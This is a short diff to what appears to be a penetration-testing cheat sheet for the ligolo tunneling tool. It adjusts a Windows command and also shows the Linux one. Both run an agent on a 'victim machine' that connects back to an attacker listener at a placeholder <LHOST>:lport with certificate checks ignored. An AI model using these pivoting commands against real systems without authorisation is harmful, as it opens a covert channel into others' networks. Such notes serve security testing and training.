@@ -17,7 +17,7 @@ sudo ip link set ligolo up
 ### Agent - agent needs to be run on victim machine
 #### connect the agent to server
 ##### windows agent
-```agent.exe -connect <LHOST>:lport -ignore-cert```
+```.\agent.exe -connect <LHOST>:lport -ignore-cert```
 ##### linux agent
 ```./agent -connect <LHOST>:lport -ignore-cert```
 
